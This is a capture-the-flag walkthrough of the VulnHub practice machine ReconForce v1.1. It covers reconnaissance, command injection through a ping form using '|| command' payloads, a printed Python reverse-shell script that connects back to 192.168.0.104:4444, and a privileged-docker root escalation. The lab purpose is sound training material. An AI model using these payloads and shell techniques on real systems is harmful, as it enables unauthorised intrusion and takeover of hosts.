# Walkthrough: [ReconForce v1.1](https://www.vulnhub.com/entry/hacknos-reconforce-v11,416/)
## Video Guide: [Youtube link](https://www.youtube.com/watch?v=zZCXck8f-m0)
## Table of Contents

- [Enumeration](#enumeration)
- [Penetration](#penetration)
- [Escelation](#escelation)
- [Bonus](#bonus)
	- [CLI](#cli)
	- [Intresting Files](#intresting-files)

## Enumeration
- VM IP: `sudo netdiscover`

	* `VMWare 192.168.0.14 `
	
- VM info: `nmap -A -T4 -v 192.168.0.14`
	
	* <pre>
	  21/tcp open  ftp     vsftpd 2.0.8 or later
	  22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
	  880/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	  </pre>
	* FTP **Anonymous** log-in is on. 
		* FTP Server Banner: "ftp 'Security@hackNos'"
	  
- Web Server Directory: `dirb -w http://192.168.0.14` 

	* <pre>
	  http://192.168.0.14/index.html
	  http://192.168.0.14/css/style.css
	  http://192.168.0.14/css/2.jpg
	  </pre>
	  
- Web Server 192.168.0.14/5ecure login using:

	* admin:Security@hackNos, FTP Server Banner

- Web Server Directory: `dirb -w http://192.168.0.14/5ecure`		
	* <pre>
	  http://192.168.0.14/5ecure/index.html, form that POSTs data to output.php
	  http://192.168.0.14/5ecure/css/style.css
	  http://192.168.0.14/5ecure/css/2.jpg
	  http://192.168.0.14/5ecure/output.php, simple ping <ip> function + stdout
	  </pre>

## Penetration
- 192.168.0.14/5ecure/out.php

	* `exec(ping $ip)`, possible shell injection 
	
- $ip = || command

	* '; command' / '&& command' / '& command' didn't work out, possible character escape 
	* Examples:
		* ip=|| ls, *system navigation*
		* ip=|| whoami, *www-data*
		* ip=|| vi *filename*, *privilege check*
		* ip=|| export	

- [intresting files](#intresting-files):

	* /var/opt/python.py, creates a connection to 192.168.0.104:4444 and runs an interactive shell
	* /etc/passwd, user information

## Escelation

- `ssh 192.168.0.14 -l recon`
	* pass: Security@hackNos
- `docker run -it --privileged --name=ctf -v /:/host:rw alpine sh`
- Container: `cd /host`

---

## Bonus

### CLI 
- Configurate host/attacking machine network settings
	* Add a new network connection and manualy set it up:
		- IP: 192.168.0.104
		- Netmask: 255.255.255.0
		- Gateway: 192.168.0.1
		- Connect to the network using the new interface
- `nc -lvp 4444` to initiate a listener on 4444
- On 192.168.0.14/5ecure/index.php ping scan, run '|| python /var/opt/python.py' 
- tty: `python -c 'import pty; pty.spawn("/bin/bash")'`
- `getent group`: 
	* `docker:x:119:`, passwd --> `recon:x:1000:119:rahul:/home/recon:/bin/bash`
	* recon user gid = docker 

### Intresting files

- /var/opt/python.py:
	```
	import socket
	import subprocess
	import os
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.0.104", 4444))
	os.dup2(s.fileno(), 0)
	os.dup2(s.fileno(), 1)
	os.dup2(s.fileno(), 2)
	p = subprocess.call(["/bin/bash", "-i"])
	```
	
- /var/etc:
	```
	root:x:0:0:root:/root:/bin/bash
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	recon:x:1000:119:rahul:/home/recon:/bin/bash
	ftp:x:111:117:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
	```
